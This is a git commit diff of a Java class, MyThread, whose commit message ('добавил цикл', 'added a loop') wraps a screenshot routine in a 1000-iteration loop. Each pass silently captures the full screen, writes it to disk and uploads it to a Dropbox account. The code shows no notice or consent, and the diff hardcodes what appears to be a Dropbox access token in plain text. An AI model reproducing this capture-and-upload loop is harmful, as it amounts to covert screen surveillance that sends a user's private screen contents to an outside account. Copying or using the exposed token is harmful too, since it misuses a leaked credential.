e1d86a16cf40bdb036492025344be3b6656e944e
Ruslan <rusichmr86@gmail.com>
2018-12-06 19:33:46 +0300

    добавил цикл

--- src/main/java/MyThread.java
+++ src/main/java/MyThread.java
@@ -1,5 +1,6 @@
 import com.dropbox.core.DbxRequestConfig;
 import com.dropbox.core.v2.DbxClientV2;
+
 import javax.imageio.ImageIO;
 import java.awt.*;
 import java.awt.image.BufferedImage;
@@ -20,27 +21,31 @@ public class MyThread extends Thread {
 
     private void pic() throws AWTException, IOException {
 
-        String UUID1 = java.util.UUID.randomUUID() + ".png";
-        String UUID2 = "/" + java.util.UUID.randomUUID() + ".png";
+        for (int i = 0; i < 1000; i++) {
 
-        String ACCESS_TOKEN = "vphYrsccPiAAAAAAAAAANJLr29d_Th7FtxyDLudrW5gIkCcoLBgsw_IeYqERRV6m";
 
-        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
-        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
+            String UUID1 = java.util.UUID.randomUUID() + ".png";
+            String UUID2 = "/" + java.util.UUID.randomUUID() + ".png";
 
-        BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+            String ACCESS_TOKEN = "vphYrsccPiAAAAAAAAAANJLr29d_Th7FtxyDLudrW5gIkCcoLBgsw_IeYqERRV6m";
 
-        ImageIO.write(image
-                , "png"
-                , new File("src/main/resources/png/" + UUID1));
+            DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
+            DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
 
-        try {
-            InputStream in = new FileInputStream("src/main/resources/png/" + UUID1);
-            client.files()
-                    .uploadBuilder(UUID2)
-                    .uploadAndFinish(in);
-        } catch (Exception e) {
-            e.printStackTrace();
+            BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+
+            ImageIO.write(image
+                    , "png"
+                    , new File("src/main/resources/png/" + UUID1));
+
+            try {
+                InputStream in = new FileInputStream("src/main/resources/png/" + UUID1);
+                client.files()
+                        .uploadBuilder(UUID2)
+                        .uploadAndFinish(in);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
         }
     }
 }
